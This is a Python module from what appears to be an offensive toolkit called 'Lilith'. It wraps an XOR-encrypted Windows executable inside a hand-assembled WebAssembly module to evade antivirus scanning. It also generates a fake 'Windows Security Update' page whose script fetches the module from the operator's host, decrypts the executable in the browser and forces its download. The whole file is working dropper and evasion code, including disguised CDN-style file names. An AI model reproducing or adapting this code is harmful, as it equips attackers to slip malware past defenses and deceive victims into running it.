"""
Lilith — WebAssembly PE container builder.

Wraps the compiled runner PE in a WebAssembly module as a static evasion layer.
The .wasm file on disk / in-transit contains only valid WASM bytecode — no x64
opcodes, no PE MZ header, no shellcode byte patterns. AV scanners have significantly
weaker WASM parsing compared to PE / shellcode heuristics.

Delivery: serve wasm_payload.wasm + wasm_loader.html from the Lilith HTTPS server.
When the target browses to the HTML URL, the JS fetches the .wasm, instantiates it
(passing an import callback), WASM XOR-decrypts the PE in linear memory, then calls
back into JS with (ptr, len). JS creates a Blob URL and triggers a browser download
of the resulting .exe via a synthesised <a download> click.

Chain vs standard stager:
  standard path : runner_c.dat  (XOR-encoded PE)    → PS stager
  WASM path     : wasm_payload.wasm (WASM-wrapped PE) → browser lure → exe download
"""

from __future__ import annotations

import os
import random
import secrets

# CDN-style static asset name pools — match real webpack/Vite/Next.js patterns
_WASM_PREFIXES = [
    "runtime", "vendor", "chunk", "main", "app", "core", "worker",
    "polyfill", "common", "shared", "utils", "lib",
]
_HTML_NAMES = [
    "update", "setup", "portal", "install", "verify", "check",
    "activate", "confirm", "validate", "init",
]


# ── LEB128 ────────────────────────────────────────────────────────────────────────

def _uleb(n: int) -> bytes:
    buf = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            buf.append(0x80 | byte)
        else:
            buf.append(byte)
            break
    return bytes(buf)


def _sleb(n: int) -> bytes:
    buf = []
    more = True
    while more:
        byte = n & 0x7F
        n >>= 7
        if (n == 0 and not (byte & 0x40)) or (n == -1 and (byte & 0x40)):
            more = False
        else:
            byte |= 0x80
        buf.append(byte)
    return bytes(buf)


# ── WASM section framing ──────────────────────────────────────────────────────────

def _section(sid: int, content: bytes) -> bytes:
    return bytes([sid]) + _uleb(len(content)) + content


def _vec(items: list) -> bytes:
    return _uleb(len(items)) + b"".join(items)


# ── WASM sections ─────────────────────────────────────────────────────────────────

def _type_section() -> bytes:
    # Type 0: (i32, i32) -> ()   — exec(ptr, len): imported JS callback
    # Type 1: () -> ()           — run(): exported decryptor
    type0 = b"\x60" + _uleb(2) + b"\x7F\x7F" + _uleb(0)
    type1 = b"\x60" + _uleb(0) + _uleb(0)
    return _section(0x01, _vec([type0, type1]))


def _import_section() -> bytes:
    # import env.exec of type 0
    mod   = b"\x03env"
    name  = b"\x04exec"
    entry = mod + name + b"\x00" + _uleb(0)
    return _section(0x02, _vec([entry]))


def _function_section() -> bytes:
    # one local function: type index 1
    return _section(0x03, _vec([_uleb(1)]))


def _memory_section(num_pages: int) -> bytes:
    # min only, no max
    return _section(0x05, _vec([b"\x00" + _uleb(num_pages)]))


def _export_section() -> bytes:
    # "run"    -> funcidx 1  (0 is the import)
    # "memory" -> memidx  0
    run_exp = b"\x03run"    + b"\x00" + _uleb(1)
    mem_exp = b"\x06memory" + b"\x02" + _uleb(0)
    return _section(0x07, _vec([run_exp, mem_exp]))


def _data_section(payload: bytes) -> bytes:
    # active segment at linear address 0
    init_expr = b"\x41\x00\x0B"   # i32.const 0, end
    segment   = b"\x00" + init_expr + _uleb(len(payload)) + payload
    return _section(0x0B, _uleb(1) + segment)


def _code_section(key: int, payload_len: int) -> bytes:
    """
    WASM bytecode for run():
      local i: i32 = 0
      loop:
        mem[i] = mem[i] XOR key
        i++
        if i < payload_len: goto loop
      exec(ptr=0, len=payload_len)   // calls imported JS function
    """
    i32c   = lambda v: b"\x41" + _sleb(v)
    lget   = lambda x: b"\x20" + _uleb(x)
    lset   = lambda x: b"\x21" + _uleb(x)
    load8u = b"\x2D\x00\x00"   # i32.load8_u  align=0 offset=0
    store8 = b"\x3A\x00\x00"   # i32.store8   align=0 offset=0

    body = (
        i32c(0)              +
        lset(0)              +          # i = 0
        b"\x03\x40"          +          # loop $L (void)
          lget(0)            +          # addr for store
          lget(0)            +
          load8u             +          # mem[i]
          i32c(key)          +
          b"\x73"            +          # i32.xor
          store8             +          # mem[i] = decrypted
          lget(0)            +
          i32c(1)            +
          b"\x6A"            +          # i32.add
          lset(0)            +          # i++
          lget(0)            +
          i32c(payload_len)  +
          b"\x49"            +          # i32.lt_u
          b"\x0D\x00"        +          # br_if $L
        b"\x0B"              +          # end loop
        i32c(0)              +          # ptr = 0
        i32c(payload_len)    +          # len
        b"\x10\x00"          +          # call funcidx 0  (exec)
        b"\x0B"                         # end function
    )

    # locals: vec([(1, i32)])
    locals_vec      = _uleb(1) + b"\x01\x7F"
    body_with_locals = locals_vec + body
    func_entry      = _uleb(len(body_with_locals)) + body_with_locals
    return _section(0x0A, _vec([func_entry]))


# ── Module assembler ──────────────────────────────────────────────────────────────

def build_wasm_module(payload: bytes, key: int) -> bytes:
    """
    Assemble a complete WebAssembly module that:
      - embeds XOR-encrypted payload in a data segment at offset 0
      - exports run() which decrypts in-place then calls imports.env.exec(0, len)
      - exports memory so JS can read the decrypted bytes back
    """
    num_pages = max(2, (len(payload) + 65535) // 65536 + 1)
    encrypted = bytes(b ^ key for b in payload)

    return (
        b"\x00asm\x01\x00\x00\x00"
        + _type_section()
        + _import_section()
        + _function_section()
        + _memory_section(num_pages)
        + _export_section()
        + _code_section(key, len(payload))
        + _data_section(encrypted)
    )


# ── HTML / JS harness ─────────────────────────────────────────────────────────────

def _build_loader_html(wasm_url: str, exe_name: str, title: str) -> str:
    return (
        "<!DOCTYPE html>\n"
        "<html lang=\"en\">\n"
        "<head>\n"
        "<meta charset=\"UTF-8\">\n"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n"
        f"<title>{title}</title>\n"
        "<style>\n"
        "body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f4f6;"
        "display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}\n"
        ".card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.12);"
        "padding:40px 48px;max-width:440px;text-align:center}\n"
        "h1{font-size:1.35rem;color:#1a1a2e;margin:16px 0 10px}\n"
        "p{color:#555;line-height:1.6;margin:0 0 22px}\n"
        ".note{display:none;color:#0078d4;font-size:.9rem}\n"
        "</style>\n"
        "</head>\n"
        "<body>\n"
        "<div class=\"card\">\n"
        "  <svg width=\"52\" height=\"52\" viewBox=\"0 0 24 24\" fill=\"none\" "
        "stroke=\"#0078d4\" stroke-width=\"1.6\" stroke-linecap=\"round\" "
        "stroke-linejoin=\"round\"><path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/>"
        "</svg>\n"
        f"  <h1>{title}</h1>\n"
        "  <p>Verifying your device security configuration.<br>"
        "Please wait while the package is prepared.</p>\n"
        "  <div class=\"note\" id=\"n\">Package ready — check your downloads folder.</div>\n"
        "</div>\n"
        "<script>\n"
        "(function(){\n"
        f"var _u=\"{wasm_url}\";\n"
        f"var _n=\"{exe_name}\";\n"
        "var _mi;\n"
        "function _x(p,l){\n"
        "  var v=new Uint8Array(_mi.exports.memory.buffer,p,l);\n"
        "  var b=new Blob([v],{type:\"application/octet-stream\"});\n"
        "  var u=URL.createObjectURL(b);\n"
        "  var a=document.createElement(\"a\");\n"
        "  a.href=u;a.download=_n;\n"
        "  document.body.appendChild(a);a.click();\n"
        "  setTimeout(function(){URL.revokeObjectURL(u);a.remove();},3000);\n"
        "  document.getElementById(\"n\").style.display=\"block\";\n"
        "}\n"
        "fetch(_u,{cache:\"no-store\"})\n"
        "  .then(function(r){return r.arrayBuffer();})\n"
        "  .then(function(buf){\n"
        "    return WebAssembly.instantiate(buf,{env:{exec:_x}});\n"
        "  })\n"
        "  .then(function(r){\n"
        "    _mi=r.instance;\n"
        "    _mi.exports.run();\n"
        "  })\n"
        "  .catch(function(){});\n"
        "})();\n"
        "</script>\n"
        "</body>\n"
        "</html>\n"
    )


# ── Public entry point ────────────────────────────────────────────────────────────

def build_wasm_dropper(
    runner_dat_path: str,
    runner_xor_key:  int,
    out_dir:         str,
    lhost:           str,
    port:            int,
    url_prefix:      str = "/cdn/static/v3",
    exe_name:        str = "WindowsSecurityUpdate.exe",
    page_title:      str = "Windows Security Update",
) -> tuple[str, str]:
    """
    Decode runner_c.dat → raw PE, re-encrypt with a fresh random key, embed in a
    WebAssembly module, and generate the HTML harness.

    Returns (wasm_out_path, html_out_path).
    """
    with open(runner_dat_path, "rb") as f:
        encoded = f.read()

    raw_pe = bytes(b ^ runner_xor_key for b in encoded)

    # Pick WASM XOR key: non-zero, distinct from runner key
    while True:
        wasm_key = random.randint(1, 254)
        if wasm_key != runner_xor_key:
            break

    wasm_bytes = build_wasm_module(raw_pe, wasm_key)

    os.makedirs(out_dir, exist_ok=True)

    # Randomised names per build — no "wasm" or "loader" in path
    # WASM: looks like a CDN content-hashed static asset (.bin hides the WASM nature)
    # HTML: thematic word, no extension hints at purpose
    hex8      = secrets.token_hex(4)
    prefix    = random.choice(_WASM_PREFIXES)
    wasm_name = f"{prefix}.{hex8}.bin"
    html_name = random.choice(_HTML_NAMES) + ".html"

    wasm_path = os.path.join(out_dir, wasm_name)
    html_path = os.path.join(out_dir, html_name)

    with open(wasm_path, "wb") as f:
        f.write(wasm_bytes)

    wasm_url = f"https://{lhost}:{port}{url_prefix}/{wasm_name}"
    html = _build_loader_html(wasm_url, exe_name, page_title)
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html)

    print(f"[+] WASM container  : {wasm_path}  ({len(wasm_bytes):,} bytes  key=0x{wasm_key:02X})")
    print(f"[+] Loader HTML     : {html_path}")
    print(f"    Delivery URL    : https://{lhost}:{port}{url_prefix}/{html_name}")
    print(f"    Download name   : {exe_name}")

    return wasm_path, html_path
